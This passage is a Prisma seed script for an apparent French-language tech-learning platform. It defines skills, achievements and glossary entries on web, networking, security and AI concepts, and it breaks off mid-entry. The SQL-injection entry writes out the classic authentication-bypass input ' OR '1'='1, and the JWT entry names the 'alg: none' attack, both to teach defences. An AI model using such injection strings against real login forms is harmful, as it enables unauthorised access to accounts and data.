import { PrismaClient } from "@prisma/client";
import type { SkillCategory } from "../src/types/skill.js";

const prisma = new PrismaClient();

/**
 * Catalogue initial de compétences (Phase 3). Volontairement non-exhaustif :
 * assez pour couvrir les domaines listés dans la vision Nodify, sans lister
 * les dizaines de technologies qui n'auront de sens qu'une fois l'Academy
 * (Phase 5) et la Cyber Academy (Phase 8) réellement construites.
 */
const SKILLS: { key: string; name: string; category: SkillCategory }[] = [
  // Development
  { key: "javascript", name: "JavaScript", category: "DEVELOPMENT" },
  { key: "typescript", name: "TypeScript", category: "DEVELOPMENT" },
  { key: "nodejs", name: "Node.js", category: "DEVELOPMENT" },
  { key: "python", name: "Python", category: "DEVELOPMENT" },
  { key: "sql", name: "SQL", category: "DEVELOPMENT" },
  { key: "html-css", name: "HTML/CSS", category: "DEVELOPMENT" },
  { key: "git", name: "Git", category: "DEVELOPMENT" },
  { key: "apis", name: "APIs & REST", category: "DEVELOPMENT" },

  // Cybersecurity
  { key: "cyber-fundamentals", name: "Cybersecurity Fundamentals", category: "CYBERSECURITY" },
  { key: "web-security", name: "Web Security", category: "CYBERSECURITY" },
  { key: "cryptography", name: "Cryptography", category: "CYBERSECURITY" },
  { key: "secure-coding", name: "Secure Coding", category: "CYBERSECURITY" },

  // Networking
  { key: "networking-fundamentals", name: "Networking Fundamentals", category: "NETWORKING" },
  { key: "tcp-ip", name: "TCP/IP & DNS", category: "NETWORKING" },

  // AI
  { key: "ai-fundamentals", name: "AI Fundamentals", category: "AI" },

  // Systems
  { key: "linux", name: "Linux", category: "SYSTEMS" },
  { key: "windows", name: "Windows", category: "SYSTEMS" },

  // Cloud
  { key: "docker", name: "Docker", category: "CLOUD" },
  { key: "cloud-fundamentals", name: "Cloud Fundamentals", category: "CLOUD" },
  { key: "cicd", name: "CI/CD & DevOps", category: "CLOUD" },

  // Cybersecurity (suite)
  { key: "red-team-fundamentals", name: "Red Team Fundamentals", category: "CYBERSECURITY" },
  { key: "blue-team-fundamentals", name: "Blue Team Fundamentals", category: "CYBERSECURITY" },

  // AI (suite)
  { key: "prompt-engineering", name: "Prompt Engineering", category: "AI" },
];

const ACHIEVEMENTS = [
  {
    key: "welcome",
    name: "Bienvenue sur Nodify",
    description: "Ta toute première interaction avec Nodify.",
    icon: "👋",
  },
  {
    key: "first-course-complete",
    name: "Premier cours terminé",
    description: "Tu as terminé ton premier cours sur Nodify Academy.",
    icon: "🎓",
  },
  {
    key: "critical-thinker",
    name: "Esprit critique",
    description: "Tu as déjoué une tentative d'ingénierie sociale dans la Trust Nothing Simulation.",
    icon: "🕵️",
  },
  {
    key: "first-flag",
    name: "Premier flag capturé",
    description: "Tu as résolu ton premier défi CTF sur Nodify.",
    icon: "🚩",
  },
  {
    key: "blue-team-analyst",
    name: "Analyste Blue Team",
    description: "Tu as correctement identifié un indicateur de compromission dans une simulation d'incident.",
    icon: "🔵",
  },
];

/**
 * Premier lot de concepts du Knowledge Engine (Phase 4), rédigés à la main —
 * pas de génération IA (le provider n'est choisi qu'en Phase 6). Le RAG
 * viendra enrichir/étendre ce catalogue plus tard, pas le remplacer.
 */
interface ConceptSeed {
  key: string;
  name: string;
  category: SkillCategory;
  level: number; // 1 (Beginner) à 5 (Expert)
  definition: string;
  explanationBeginner: string;
  explanationAdvanced: string;
  docUrl: string;
  relatedKeys: string[];
  prerequisiteKeys: string[];
  aliases: string[];
}

const CONCEPTS: ConceptSeed[] = [
  {
    key: "http",
    name: "HTTP",
    category: "NETWORKING",
    level: 1,
    definition:
      "HyperText Transfer Protocol — le protocole de communication qui permet à un client (navigateur, app) d'échanger des requêtes et réponses avec un serveur web.",
    explanationBeginner:
      "Chaque fois que tu visites un site, ton navigateur envoie une requête HTTP (« donne-moi cette page ») et le serveur répond avec une réponse HTTP (le contenu, ou une erreur). C'est le langage commun que parlent tous les navigateurs et serveurs web.",
    explanationAdvanced:
      "HTTP est un protocole sans état (stateless) : chaque requête est indépendante, d'où le besoin de cookies/tokens pour maintenir une session. Les codes de statut sont normalisés par plage (2xx succès, 3xx redirection, 4xx erreur client, 5xx erreur serveur). HTTPS ajoute une couche TLS par-dessus pour chiffrer le trafic. HTTP/2 et HTTP/3 apportent le multiplexage pour éviter le head-of-line blocking des versions précédentes.",
    docUrl: "https://developer.mozilla.org/docs/Web/HTTP/Overview",
    relatedKeys: ["dns", "rest"],
    prerequisiteKeys: [],
    aliases: ["hypertext transfer protocol"],
  },
  {
    key: "git",
    name: "Git",
    category: "DEVELOPMENT",
    level: 1,
    definition:
      "Un système de contrôle de version distribué qui permet de suivre l'historique des modifications d'un projet et de collaborer sans écraser le travail des autres.",
    explanationBeginner:
      "Git garde une photo de ton projet à chaque « commit ». Tu peux revenir en arrière si tu casses quelque chose, voir qui a changé quoi et quand, et travailler à plusieurs sur le même projet sans se marcher dessus grâce aux branches.",
    explanationAdvanced:
      "Git stocke l'historique comme un graphe orienté acyclique (DAG) de commits, chacun référençant son (ou ses) commit(s) parent(s) et un snapshot complet de l'arbre de fichiers — pas juste un diff, contrairement à des VCS plus anciens comme SVN. Les branches ne sont que des pointeurs mobiles vers un commit. Comprendre la différence entre merge (préserve l'historique) et rebase (le réécrit) est essentiel pour collaborer proprement.",
    docUrl: "https://git-scm.com/doc",
    relatedKeys: [],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "dns",
    name: "DNS",
    category: "NETWORKING",
    level: 2,
    definition:
      "Domain Name System — le service qui traduit un nom de domaine lisible (ex: nodify.app) en adresse IP compréhensible par les machines.",
    explanationBeginner:
      "Le DNS, c'est l'annuaire téléphonique d'internet : tu connais le nom d'un site, mais ton ordinateur a besoin de son « numéro » (l'adresse IP) pour s'y connecter. Le DNS fait cette traduction automatiquement, en une fraction de seconde.",
    explanationAdvanced:
      "La résolution suit une hiérarchie : resolver récursif → serveurs racine → TLD (.com, .app...) → serveur autoritaire du domaine. Enregistrements courants : A/AAAA (IP), CNAME (alias), MX (mail), TXT (vérifications SPF/DKIM). Le DNS est mis en cache à plusieurs niveaux via le TTL de chaque enregistrement, ce qui explique la propagation parfois lente d'un changement.",
    docUrl: "https://developer.mozilla.org/docs/Glossary/DNS",
    relatedKeys: ["http"],
    prerequisiteKeys: [],
    aliases: ["domain name system"],
  },
  {
    key: "api",
    name: "API",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Application Programming Interface — un ensemble de règles qui permet à deux programmes de communiquer entre eux, sans que l'un ait besoin de connaître les détails internes de l'autre.",
    explanationBeginner:
      "Pense à une API comme au menu d'un restaurant : tu ne vas pas en cuisine préparer toi-même ton plat, tu commandes depuis le menu (l'API) et la cuisine (le serveur) te ramène ce que tu as demandé.",
    explanationAdvanced:
      "Une API peut prendre plusieurs formes (REST, GraphQL, gRPC, WebSocket...) mais le principe reste le même : un contrat explicite (endpoints, formats de données, codes d'erreur) découplant le consommateur de l'implémentation. Une bonne API reste stable même si l'implémentation change en interne — l'encapsulation appliquée à l'échelle réseau.",
    docUrl: "https://developer.mozilla.org/docs/Glossary/API",
    relatedKeys: ["rest", "jwt"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "rest",
    name: "REST",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Representational State Transfer — un style d'architecture pour concevoir des APIs web autour de ressources identifiées par des URLs et manipulées via les verbes HTTP standards.",
    explanationBeginner:
      "Dans une API REST, chaque « chose » (un utilisateur, un article...) a sa propre adresse (ex: /users/42), et tu utilises des verbes HTTP pour dire ce que tu veux faire dessus : GET pour lire, POST pour créer, PUT/PATCH pour modifier, DELETE pour supprimer.",
    explanationAdvanced:
      "REST n'est pas un protocole mais un ensemble de contraintes architecturales : absence d'état côté serveur entre les requêtes, interface uniforme, ressources auto-descriptives, et idéalement HATEOAS (rarement implémenté en pratique). Une API « RESTful » au sens strict et une simple API HTTP/JSON (souvent appelée REST par abus de langage) ne sont pas toujours la même chose.",
    docUrl: "https://restfulapi.net/",
    relatedKeys: ["api", "http"],
    prerequisiteKeys: [],
    aliases: ["representational state transfer"],
  },
  {
    key: "promise",
    name: "Promise",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un objet JavaScript représentant le résultat éventuel (succès ou échec) d'une opération asynchrone, comme un appel réseau.",
    explanationBeginner:
      "Une Promise, c'est comme un ticket de retrait au pressing : tu déposes ton linge (tu lances une opération longue), on te donne un ticket tout de suite, et plus tard tu viens récupérer soit ton linge prêt (résolu), soit une explication si ça a raté (rejeté).",
    explanationAdvanced:
      "Une Promise a 3 états : pending, fulfilled, rejected — une fois settled (fulfilled/rejected), elle ne change plus jamais d'état. `.then()`/`.catch()`/`.finally()` chaînent des callbacks ; `async/await` est du sucre syntaxique construit par-dessus, exécuté sur la microtask queue (donc prioritaire sur les macrotasks comme setTimeout dans l'event loop).",
    docUrl:
      "https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Promise",
    relatedKeys: ["event-loop"],
    prerequisiteKeys: [],
    aliases: ["promesse"],
  },
  {
    key: "event-loop",
    name: "Event Loop",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Le mécanisme qui permet à JavaScript (mono-thread) de gérer des opérations asynchrones (réseau, timers...) sans jamais bloquer l'exécution du programme.",
    explanationBeginner:
      "JavaScript ne fait qu'une chose à la fois, mais il sait « mettre de côté » les tâches longues (comme attendre une réponse réseau) pour continuer le reste du code, puis revenir traiter le résultat quand il est prêt.",
    explanationAdvanced:
      "Le moteur exécute d'abord toute la call stack, puis vide entièrement la microtask queue (Promises, queueMicrotask) avant de traiter UNE macrotask (setTimeout, I/O) de la macrotask queue, puis revide les microtasks, etc. Cet ordre explique pourquoi `Promise.resolve().then()` s'exécute toujours avant `setTimeout(fn, 0)`, même si les deux sont « asynchrones ».",
    docUrl: "https://developer.mozilla.org/docs/Web/JavaScript/Event_loop",
    relatedKeys: ["promise"],
    prerequisiteKeys: [],
    aliases: ["boucle d'événements", "boucle evenementielle"],
  },
  {
    key: "jwt",
    name: "JWT",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "JSON Web Token — un format compact et signé pour transmettre des informations vérifiables entre deux parties, le plus souvent pour authentifier un utilisateur auprès d'une API sans session côté serveur.",
    explanationBeginner:
      "Imagine un badge d'accès temporaire : quand tu te connectes, le serveur te donne un jeton (le JWT) qui prouve qui tu es. À chaque requête suivante, tu montres ce badge au lieu de retaper ton mot de passe, et le serveur vérifie qu'il n'a pas été trafiqué grâce à une signature cryptographique.",
    explanationAdvanced:
      "Un JWT a 3 parties encodées en Base64URL séparées par des points : header (algorithme), payload (les claims, ex: userId, exp) et signature (HMAC ou RSA/ECDSA). Le payload n'est PAS chiffré, seulement signé — n'y stocke jamais de données sensibles. Pièges classiques : valider l'algorithme côté serveur (attaque « alg: none »), expiration courte, et prévoir une stratégie de révocation puisqu'un JWT signé reste valide jusqu'à expiration même si le compte est compromis.",
    docUrl: "https://jwt.io/introduction",
    relatedKeys: ["api"],
    prerequisiteKeys: ["http"],
    aliases: ["json web token"],
  },
  {
    key: "docker",
    name: "Docker",
    category: "CLOUD",
    level: 3,
    definition:
      "Une plateforme qui permet d'empaqueter une application avec toutes ses dépendances dans un conteneur, garantissant qu'elle tourne de façon identique sur n'importe quelle machine.",
    explanationBeginner:
      "Un conteneur Docker, c'est comme une boîte de déménagement scellée qui contient tout ce dont ton application a besoin pour fonctionner. Peu importe la machine sur laquelle tu ouvres la boîte, le contenu est exactement le même — fini le « ça marche sur ma machine ».",
    explanationAdvanced:
      "Contrairement à une VM, un conteneur ne virtualise pas un OS complet : il partage le noyau de l'hôte et isole les processus via les namespaces et cgroups Linux, ce qui le rend plus léger et rapide à démarrer. Une image Docker est construite en couches empilées, ce qui permet un cache de build efficace. En production, on l'associe généralement à un orchestrateur (Kubernetes, Docker Swarm) pour gérer scaling, réseau et résilience.",
    docUrl: "https://docs.docker.com/get-started/overview/",
    relatedKeys: [],
    prerequisiteKeys: [],
    aliases: ["conteneur", "container"],
  },
  {
    key: "xss",
    name: "XSS",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Cross-Site Scripting — une faille de sécurité web qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page consultée par d'autres utilisateurs.",
    explanationBeginner:
      "Imagine un site où les commentaires s'affichent tels quels, sans filtrage. Un attaquant poste un commentaire contenant du code au lieu de texte normal : quand un autre visiteur lit la page, son navigateur exécute ce code sans le savoir — par exemple pour voler ses cookies de session.",
    explanationAdvanced:
      "Trois types : XSS stocké (payload sauvegardé côté serveur), XSS réfléchi (le payload transite par la requête et est renvoyé tel quel) et XSS DOM-based (vulnérabilité uniquement côté client). Défenses principales : encodage systématique des sorties selon le contexte HTML/JS/URL, Content-Security-Policy, et l'attribut HttpOnly sur les cookies sensibles pour les rendre inaccessibles en JavaScript.",
    docUrl: "https://owasp.org/www-community/attacks/xss/",
    relatedKeys: ["sql-injection"],
    prerequisiteKeys: ["http"],
    aliases: ["cross-site scripting", "cross site scripting"],
  },
  {
    key: "sql-injection",
    name: "SQL Injection",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Une faille qui permet à un attaquant d'injecter des commandes SQL non prévues dans une requête, en exploitant une entrée utilisateur mal filtrée.",
    explanationBeginner:
      "Si un site construit ses requêtes en base de données en collant directement ce que tu tapes dans un formulaire, un attaquant peut taper des instructions SQL au lieu de texte normal et manipuler la requête — par exemple pour se connecter sans mot de passe, ou récupérer toute la base.",
    explanationAdvanced:
      "Exemple classique : une requête construite par concaténation permet d'injecter `' OR '1'='1` pour contourner l'authentification. La défense fiable n'est PAS l'échappement manuel des caractères, mais l'usage systématique de requêtes préparées (paramétrées), qui séparent structurellement le code SQL des données. Un ORM correctement utilisé (comme Prisma) protège par défaut contre l'injection SQL.",
    docUrl: "https://owasp.org/www-community/attacks/SQL_Injection",
    relatedKeys: ["xss"],
    prerequisiteKeys: [],
    aliases: ["injection sql", "sqli"],
  },
  {
    key: "rag",
    name: "RAG",
    category: "AI",
    level: 4,
    definition:
      "Retrieval-Augmented Generation — une technique qui combine un moteur de recherche documentaire avec un modèle de langage, pour que l'IA réponde en s'appuyant sur des documents réels plutôt que sur sa seule mémoire.",
    explanationBeginner:
      "Plutôt que de demander à une IA de répondre uniquement « de mémoire » (avec le risque qu'elle invente des choses), le RAG lui donne d'abord accès aux bons documents — comme lui laisser ouvrir le livre pendant l'examen. L'IA lit les passages pertinents puis rédige sa réponse en s'appuyant dessus.",
    explanationAdvanced:
      "Les documents sont découpés en chunks, transformés en vecteurs (embeddings) et stockés dans une base vectorielle. À la requête, on calcule l'embedding de la question, on récupère les chunks les plus proches par similarité cosinus, puis on les injecte dans le contexte du prompt envoyé au LLM. La qualité du RAG dépend autant du chunking et du modèle d'embedding que du LLM lui-même — c'est ce que Nodify utilisera en Phase 6 pour interroger de grosses documentations techniques.",
    docUrl: "https://aws.amazon.com/what-is/retrieval-augmented-generation/",
    relatedKeys: ["api"],
    prerequisiteKeys: [],
    aliases: ["retrieval augmented generation", "retrieval-augmented generation"],
  },

  // --- Lot 2 : expansion du dictionnaire ---------------------------------

  {
    key: "closure",
    name: "Closure",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "En JavaScript, une fonction qui « se souvient » des variables de son environnement de création, même après que cet environnement a fini de s'exécuter.",
    explanationBeginner:
      "Imagine une fonction qui crée un compteur et le garde en mémoire même après être terminée : chaque fois que tu rappelles la fonction qu'elle a retournée, elle se souvient de la dernière valeur. C'est une closure — la fonction interne garde accès aux variables de la fonction externe.",
    explanationAdvanced:
      "Une closure se forme dès qu'une fonction interne référence une variable de sa fonction englobante ; le moteur JS garde cette variable vivante en mémoire tant que la closure existe (au lieu de la garbage-collector normalement). Utilisé pour l'encapsulation (variables privées), les factory functions, et les callbacks qui doivent garder un état entre appels.",
    docUrl: "https://developer.mozilla.org/docs/Web/JavaScript/Closures",
    relatedKeys: ["event-loop"],
    prerequisiteKeys: [],
    aliases: ["fermeture"],
  },
  {
    key: "async-await",
    name: "async/await",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Une syntaxe JavaScript qui permet d'écrire du code asynchrone (basé sur des Promises) comme s'il était séquentiel, sans chaîner des `.then()`.",
    explanationBeginner:
      "`await` met en pause l'exécution de la fonction (pas du programme entier) jusqu'à ce que la Promise soit résolue, puis continue avec le résultat — comme si tu attendais patiemment une réponse avant de passer à la ligne suivante, au lieu d'imbriquer des callbacks.",
    explanationAdvanced:
      "`async/await` est du sucre syntaxique par-dessus les Promises : une fonction `async` retourne toujours une Promise, et `await` ne peut être utilisé qu'à l'intérieur. Une erreur rejetée par une Promise attendue devient une exception classique, capturable avec `try/catch` — ce qui unifie la gestion d'erreurs synchrone et asynchrone.",
    docUrl:
      "https://developer.mozilla.org/docs/Web/JavaScript/Reference/Statements/async_function",
    relatedKeys: ["promise"],
    prerequisiteKeys: ["promise"],
    aliases: ["async await", "await"],
  },
  {
    key: "graphql",
    name: "GraphQL",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un langage de requête pour APIs où le client précise exactement les champs qu'il veut recevoir, au lieu de recevoir une réponse fixe définie par le serveur.",
    explanationBeginner:
      "Avec une API REST classique, tu reçois souvent plus (ou moins) de données que ce dont tu as besoin. Avec GraphQL, tu écris une requête qui liste précisément les champs voulus, et le serveur ne renvoie que ça — un seul appel peut remplacer plusieurs requêtes REST.",
    explanationAdvanced:
      "GraphQL expose un seul endpoint (généralement `/graphql`) et un schéma fortement typé décrivant les types, requêtes et mutations disponibles. Avantage : élimine l'over-fetching/under-fetching typique de REST. Inconvénient : plus complexe à mettre en cache côté HTTP, et nécessite une attention particulière aux coûts de requêtes profondément imbriquées (protection contre les requêtes abusives).",
    docUrl: "https://graphql.org/learn/",
    relatedKeys: ["api", "rest"],
    prerequisiteKeys: ["api"],
    aliases: [],
  },
  {
    key: "orm",
    name: "ORM",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Object-Relational Mapping — une bibliothèque qui permet de manipuler une base de données relationnelle avec des objets/fonctions du langage de programmation plutôt qu'en écrivant du SQL brut.",
    explanationBeginner:
      "Au lieu d'écrire `SELECT * FROM users WHERE id = 1`, tu écris quelque chose comme `User.findById(1)` dans ton langage habituel. L'ORM traduit ça en SQL pour toi — et te protège au passage des injections SQL en paramétrant les requêtes automatiquement.",
    explanationAdvanced:
      "Un ORM (Prisma, TypeORM, Sequelize...) mappe des tables à des modèles/classes et des lignes à des instances. Le compromis classique : plus rapide à écrire et plus sûr par défaut, mais peut générer des requêtes SQL sous-optimales sur des cas complexes — d'où l'intérêt de savoir lire le SQL généré (voir `EXPLAIN ANALYZE`) quand les performances deviennent critiques.",
    docUrl: "https://www.prisma.io/dataguide/types/relational/what-is-an-orm",
    relatedKeys: ["sql-injection"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "npm",
    name: "npm",
    category: "DEVELOPMENT",
    level: 1,
    definition:
      "Node Package Manager — le gestionnaire de paquets par défaut de Node.js, utilisé pour installer et partager des bibliothèques JavaScript/TypeScript.",
    explanationBeginner:
      "`npm install express` télécharge la bibliothèque « express » et ses dépendances dans un dossier `node_modules`. Le fichier `package.json` liste les dépendances du projet ; `package-lock.json` fige les versions exactes installées, pour que tout le monde ait le même environnement.",
    explanationAdvanced:
      "npm résout un arbre de dépendances (souvent avec des versions différentes de la même bibliothèque selon qui la demande) et le fige dans le lockfile pour des installations reproductibles. Alternatives : Yarn, pnpm — ce dernier économise de l'espace disque en partageant les paquets entre projets via des liens durs plutôt qu'en les dupliquant.",
    docUrl: "https://docs.npmjs.com/about-npm",
    relatedKeys: ["semver"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "semver",
    name: "Semantic Versioning",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Une convention de numérotation de version en trois nombres (MAJOR.MINOR.PATCH) qui communique le type de changement apporté par une nouvelle version.",
    explanationBeginner:
      "Version `2.4.1` : le premier nombre (MAJOR) change si la mise à jour casse la compatibilité, le deuxième (MINOR) si de nouvelles fonctionnalités sont ajoutées sans rien casser, le troisième (PATCH) pour des corrections de bugs uniquement.",
    explanationAdvanced:
      "Dans `package.json`, `^1.2.3` autorise les mises à jour MINOR et PATCH (jusqu'à `<2.0.0`), `~1.2.3` autorise seulement les PATCH. Le respect du semver n'est qu'une convention — rien n'empêche techniquement un mainteneur de casser la compatibilité dans un PATCH, d'où l'intérêt d'un lockfile pour des builds reproductibles.",
    docUrl: "https://semver.org/",
    relatedKeys: ["npm"],
    prerequisiteKeys: [],
    aliases: ["versionnage sémantique"],
  },
  {
    key: "ci-cd",
    name: "CI/CD",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Continuous Integration / Continuous Deployment — l'automatisation des tests et du déploiement à chaque changement de code, plutôt que de le faire manuellement.",
    explanationBeginner:
      "À chaque fois que tu pousses du code, un robot lance automatiquement les tests (CI) et, si tout passe, peut aussi déployer la nouvelle version en production (CD) — sans qu'un humain n'ait à cliquer sur des boutons à chaque fois.",
    explanationAdvanced:
      "L'Intégration Continue vérifie qu'un changement s'intègre proprement (build + tests) avant même la revue de code. Le Déploiement Continu va plus loin en publiant automatiquement chaque changement qui passe les vérifications — nécessite une suite de tests suffisamment fiable pour faire confiance au pipeline plutôt qu'à une vérification manuelle.",
    docUrl: "https://docs.github.com/en/actions/about-github-actions/about-continuous-integration",
    relatedKeys: ["unit-testing"],
    prerequisiteKeys: ["git"],
    aliases: ["integration continue", "deploiement continu"],
  },
  {
    key: "unit-testing",
    name: "Test Unitaire",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Un test automatisé qui vérifie le comportement d'une seule unité de code (souvent une fonction) de façon isolée, indépendamment du reste du système.",
    explanationBeginner:
      "Si tu as une fonction `addition(a, b)`, un test unitaire vérifie par exemple que `addition(2, 3)` retourne bien `5` — automatiquement, sans avoir à relancer toute l'application et tester à la main à chaque fois.",
    explanationAdvanced:
      "Un bon test unitaire est rapide, déterministe et isolé (pas de vraie base de données ni de vrai appel réseau — on utilise des mocks/stubs pour simuler les dépendances). Il se distingue du test d'intégration (qui vérifie que plusieurs composants fonctionnent bien ensemble) et du test end-to-end (qui simule un vrai parcours utilisateur).",
    docUrl: "https://martinfowler.com/bliki/UnitTest.html",
    relatedKeys: ["ci-cd"],
    prerequisiteKeys: [],
    aliases: ["unit test", "test unitaire"],
  },
  {
    key: "websocket",
    name: "WebSocket",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un protocole qui maintient une connexion bidirectionnelle et persistante entre client et serveur, contrairement à HTTP où le client doit toujours initier chaque échange.",
    explanationBeginner:
      "Avec HTTP classique, le serveur ne peut « parler » que quand le client lui pose une question. Avec un WebSocket, une fois la connexion établie, le serveur peut envoyer des messages au client à tout moment — utile pour un chat en temps réel ou des notifications live.",
    explanationAdvanced:
      "La connexion démarre par un handshake HTTP (upgrade vers le protocole `ws://` ou `wss://` chiffré), puis reste ouverte tant qu'aucune des deux parties ne la ferme. Contrairement au polling (interroger le serveur en boucle), le WebSocket évite de gaspiller des requêtes inutiles, mais impose de gérer soi-même la reconnexion en cas de coupure réseau.",
    docUrl: "https://developer.mozilla.org/docs/Web/API/WebSockets_API",
    relatedKeys: ["http"],
    prerequisiteKeys: ["http"],
    aliases: ["websockets"],
  },
  {
    key: "json",
    name: "JSON",
    category: "DEVELOPMENT",
    level: 1,
    definition:
      "JavaScript Object Notation — un format texte léger pour représenter des données structurées (objets, tableaux, nombres, chaînes...), utilisé massivement pour échanger des données entre systèmes.",
    explanationBeginner:
      "`{ \"nom\": \"Alice\", \"age\": 25 }` est un exemple de JSON : des paires clé-valeur lisibles par un humain ET facilement analysables par une machine. La plupart des APIs web envoient et reçoivent leurs données dans ce format.",
    explanationAdvanced:
      "JSON ne supporte que quelques types (string, number, boolean, null, object, array) — pas de dates natives, pas de commentaires, pas de `undefined`. `JSON.stringify()`/`JSON.parse()` convertissent entre objets JavaScript et texte JSON ; attention aux références circulaires qui font planter `stringify()`.",
    docUrl: "https://www.json.org/json-en.html",
    relatedKeys: ["api"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "regex",
    name: "Expression régulière",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Une séquence de caractères qui définit un motif de recherche dans du texte, utilisée pour valider, rechercher ou remplacer des chaînes selon un format précis.",
    explanationBeginner:
      "Par exemple, `/^\\d{5}$/` vérifie qu'une chaîne contient exactement 5 chiffres, comme un code postal français. Plutôt que d'écrire du code compliqué pour vérifier ça caractère par caractère, une regex l'exprime en une seule ligne.",
    explanationAdvanced:
      "Les regex sont puissantes mais peuvent devenir illisibles rapidement, et certains motifs mal écrits provoquent du « catastrophic backtracking » — un temps d'exécution qui explose exponentiellement sur certaines entrées (source de vraies vulnérabilités ReDoS en production). Toujours tester une regex complexe avec des entrées limites avant de la déployer.",
    docUrl: "https://developer.mozilla.org/docs/Web/JavaScript/Guide/Regular_Expressions",
    relatedKeys: [],
    prerequisiteKeys: [],
    aliases: ["regexp", "expression reguliere"],
  },
  {
    key: "idempotency",
    name: "Idempotence",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Une opération est idempotente si l'exécuter plusieurs fois produit le même résultat que l'exécuter une seule fois — sans effet de bord supplémentaire à chaque répétition.",
    explanationBeginner:
      "Éteindre une lampe qui est déjà éteinte ne change rien : c'est idempotent. À l'inverse, ajouter un article au panier à chaque clic sur « Ajouter » ne l'est pas — cliquer deux fois ajoute deux articles.",
    explanationAdvanced:
      "En HTTP, GET/PUT/DELETE sont censés être idempotents (répéter la requête ne change rien de plus après la première fois), contrairement à POST. C'est crucial pour la fiabilité réseau : si un client ne reçoit pas de réponse et retente automatiquement une requête PUT, ce n'est pas grave si c'est réellement idempotent côté serveur — pas pour un POST de paiement, par exemple, d'où l'usage de clés d'idempotence pour sécuriser les retries sur des opérations sensibles.",
    docUrl: "https://developer.mozilla.org/docs/Glossary/Idempotent",
    relatedKeys: ["http", "rest"],
    prerequisiteKeys: ["http"],
    aliases: ["idempotent"],
  },
  {
    key: "cors",
    name: "CORS",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Cross-Origin Resource Sharing — un mécanisme de sécurité du navigateur qui bloque par défaut les requêtes JavaScript vers un domaine différent de celui de la page, sauf autorisation explicite du serveur cible.",
    explanationBeginner:
      "Si ton site `monsite.com` essaie d'appeler une API sur `api-externe.com` depuis le navigateur, celui-ci bloque la réponse par défaut (protection contre certaines attaques). L'API doit explicitement dire « j'autorise monsite.com » via un en-tête HTTP pour que ça fonctionne.",
    explanationAdvanced:
      "CORS fonctionne via des en-têtes HTTP (`Access-Control-Allow-Origin` et consorts) renvoyés par le serveur ; pour les requêtes « non simples » (avec certains headers/méthodes), le navigateur envoie d'abord une requête `OPTIONS` de pré-vérification (preflight). CORS protège le navigateur qui fait la requête, pas le serveur — un attaquant qui appelle ton API directement (pas depuis un navigateur) n'est pas concerné par CORS, il faut une vraie authentification côté serveur pour se protéger réellement.",
    docUrl: "https://developer.mozilla.org/docs/Web/HTTP/CORS",
    relatedKeys: ["http"],
    prerequisiteKeys: ["http"],
    aliases: [],
  },
  {
    key: "mfa",
    name: "MFA / 2FA",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "Multi-Factor Authentication — exiger au moins deux preuves d'identité différentes (ex: mot de passe + code temporaire) pour se connecter, plutôt qu'un seul facteur.",
    explanationBeginner:
      "Même si quelqu'un vole ton mot de passe, il ne peut pas se connecter sans le deuxième facteur (ton téléphone, une clé physique...). C'est pour ça qu'activer le 2FA partout où c'est possible protège énormément, même avec un mot de passe imparfait.",
    explanationAdvanced:
      "Les trois catégories de facteurs : ce que tu sais (mot de passe), ce que tu possèdes (téléphone, clé FIDO2/U2F), ce que tu es (biométrie). Les codes SMS sont le facteur le plus faible (vulnérables au SIM swapping) ; les applications TOTP (Google Authenticator...) et les clés physiques FIDO2 sont nettement plus robustes.",
    docUrl: "https://owasp.org/www-community/controls/Multi_Factor_Authentication",
    relatedKeys: [],
    prerequisiteKeys: [],
    aliases: ["2fa", "authentification a deux facteurs", "authentification multifacteur"],
  },
  {
    key: "csrf",
    name: "CSRF",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Cross-Site Request Forgery — une attaque qui pousse le navigateur d'une victime déjà connectée à envoyer une requête non désirée vers un site, à son insu.",
    explanationBeginner:
      "Si tu es connecté à ta banque et que tu visites un site malveillant, celui-ci peut essayer de faire envoyer une requête à ta banque (ex: un virement) en utilisant ta session déjà ouverte, sans que tu t'en rendes compte — c'est du CSRF.",
    explanationAdvanced:
      "Le navigateur envoie automatiquement les cookies de session sur toute requête vers le domaine correspondant, même initiée par une page tierce — c'est ce que le CSRF exploite. Défenses : tokens anti-CSRF (valeur imprévisible vérifiée à chaque requête sensible), cookies `SameSite=Strict/Lax` qui empêchent leur envoi cross-site, et vérification de l'en-tête `Origin`/`Referer`.",
    docUrl: "https://owasp.org/www-community/attacks/csrf",
    relatedKeys: ["xss"],
    prerequisiteKeys: ["http"],
    aliases: ["cross-site request forgery"],
  },
  {
    key: "zero-trust",
    name: "Zero Trust",
    category: "CYBERSECURITY",
    level: 4,
    definition:
      "Un modèle de sécurité où aucun utilisateur ni appareil n'est automatiquement fait confiance, même à l'intérieur du réseau de l'entreprise — chaque accès est vérifié explicitement.",
    explanationBeginner:
      "Avant, une fois « dans » le réseau de l'entreprise (via le bureau ou un VPN), on faisait souvent confiance par défaut. Le Zero Trust part du principe inverse : « ne fais confiance à rien, vérifie tout », que la demande vienne de l'extérieur ou de l'intérieur.",
    explanationAdvanced:
